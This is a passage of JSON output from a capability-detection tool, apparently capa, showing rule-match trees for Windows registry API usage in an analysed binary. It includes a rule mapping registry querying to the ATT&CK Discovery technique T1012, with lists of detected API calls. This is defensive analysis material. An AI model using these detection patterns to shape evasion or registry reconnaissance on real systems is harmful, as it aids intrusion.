                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::OpenRemoteBaseKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::CreateSubKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651780816
                        },
                        {
                          "type": "absolute",
                          "value": 1651781454
                        }
                      ],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "RegGetValue"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "RegEnumValue"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "RegQueryValue"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "RegQueryValueEx"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651781565
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "RegQueryMultipleValues"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "ZwQueryValueKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "ZwEnumerateValueKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "NtQueryValueKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "NtEnumerateValueKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "RtlQueryRegistryValues"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHGetValue"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHEnumValue"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHRegGetInt"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHRegGetPath"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHRegGetValue"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHQueryValueEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHRegGetUSValue"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHOpenRegStream"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHRegEnumUSValue"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHOpenRegStream2"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHRegQueryUSValue"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHRegGetBoolUSValue"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHRegGetValueFromHKCUHKLM"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHRegGetBoolValueFromHKCUHKLM"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "Microsoft.Win32.RegistryKey::GetValue"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "Microsoft.Win32.RegistryKey::GetValueKind"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "Microsoft.Win32.RegistryKey::GetValueNames"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "Microsoft.Win32.Registry::GetValue"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651782064
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "optional"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "match",
                          "match": "create or open registry key"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "or"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenKeyEx"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651782141
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegCreateKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegCreateKeyEx"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenCurrentUser"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenUserClassesRoot"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegCreateKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKeyEx"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwCreateKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKeyTransactedEx"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwCreateKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "NtOpenKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "NtCreateKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "SHRegOpenUSKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "SHRegCreateUSKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RtlCreateRegistryKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::OpenSubKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::OpenBaseKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::OpenRemoteBaseKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::CreateSubKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "or"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenKeyEx"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651782425
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegCreateKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegCreateKeyEx"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenCurrentUser"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenUserClassesRoot"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegCreateKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKeyEx"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwCreateKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKeyTransactedEx"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwCreateKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "NtOpenKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "NtCreateKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "SHRegOpenUSKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "SHRegCreateUSKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RtlCreateRegistryKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::OpenSubKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::OpenBaseKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::OpenRemoteBaseKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::CreateSubKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651782064
                        },
                        {
                          "type": "absolute",
                          "value": 1651782384
                        }
                      ],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "RegGetValue"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "RegEnumValue"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "RegQueryValue"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "RegQueryValueEx"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651782848
                        },
                        {
                          "type": "absolute",
                          "value": 1651782944
                        },
                        {
                          "type": "absolute",
                          "value": 1651782486
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "RegQueryMultipleValues"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "ZwQueryValueKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "ZwEnumerateValueKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "NtQueryValueKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "NtEnumerateValueKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "RtlQueryRegistryValues"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHGetValue"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHEnumValue"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHRegGetInt"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHRegGetPath"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHRegGetValue"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHQueryValueEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHRegGetUSValue"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHOpenRegStream"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHRegEnumUSValue"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHOpenRegStream2"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHRegQueryUSValue"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHRegGetBoolUSValue"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHRegGetValueFromHKCUHKLM"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHRegGetBoolValueFromHKCUHKLM"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "Microsoft.Win32.RegistryKey::GetValue"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "Microsoft.Win32.RegistryKey::GetValueKind"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "Microsoft.Win32.RegistryKey::GetValueNames"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "Microsoft.Win32.Registry::GetValue"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "query or enumerate registry key": {
        "meta": {
          "name": "query or enumerate registry key",
          "namespace": "host-interaction/registry",
          "authors": [
            "michael.hunhoff@mandiant.com"
          ],
          "scopes": {
            "static": "function",
            "dynamic": "span of calls"
          },
          "attack": [
            {
              "parts": [
                "Discovery",
                "Query Registry"
              ],
              "tactic": "Discovery",
              "technique": "Query Registry",
              "subtechnique": "",
              "id": "T1012"
            }
          ],
          "mbc": [
            {
              "parts": [
                "Operating System",
                "Registry",
                "Query Registry Key"
              ],
              "objective": "Operating System",
              "behavior": "Registry",
              "method": "Query Registry Key",
              "id": "C0036.005"
            }
          ],
          "references": [],
          "examples": [
            "493167E85E45363D09495D0841C30648:0x404930",
            "B5F85C26D7AA5A1FB4AF5821B6B5AB9B:0x402608"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: query or enumerate registry key\r\n    namespace: host-interaction/registry\r\n    authors:\r\n      - michael.hunhoff@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: span of calls\r\n    att&ck:\r\n      - Discovery::Query Registry [T1012]\r\n    mbc:\r\n      - Operating System::Registry::Query Registry Key [C0036.005]\r\n    examples:\r\n      - 493167E85E45363D09495D0841C30648:0x404930\r\n      - B5F85C26D7AA5A1FB4AF5821B6B5AB9B:0x402608\r\n  features:\r\n    - and:\r\n      - optional:\r\n        - match: create or open registry key\r\n      - or:\r\n        - api: advapi32.RegEnumKey\r\n        - api: advapi32.RegEnumKeyEx\r\n        - api: advapi32.RegQueryInfoKeyA\r\n        - api: ZwQueryKey\r\n        - api: ZwEnumerateKey\r\n        - api: NtQueryKey\r\n        - api: NtEnumerateKey\r\n        - api: RtlCheckRegistryKey\r\n        - api: SHEnumKeyEx\r\n        - api: SHQueryInfoKey\r\n        - api: SHRegEnumUSKey\r\n        - api: SHRegQueryInfoUSKey\r\n        - api: Microsoft.Win32.RegistryKey::GetSubKeyNames\r\n        - api: Microsoft.Win32.RegistryKey::OpenBaseKey\r\n        - api: Microsoft.Win32.RegistryKey::OpenRemoteBaseKey\r\n        - api: Microsoft.Win32.RegistryKey::OpenSubKey\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651776352
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "optional"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "match",
                          "match": "create or open registry key"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "or"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenKeyEx"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651776416
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegCreateKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegCreateKeyEx"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenCurrentUser"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenUserClassesRoot"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegCreateKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKeyEx"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwCreateKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKeyTransactedEx"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwCreateKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "NtOpenKey"
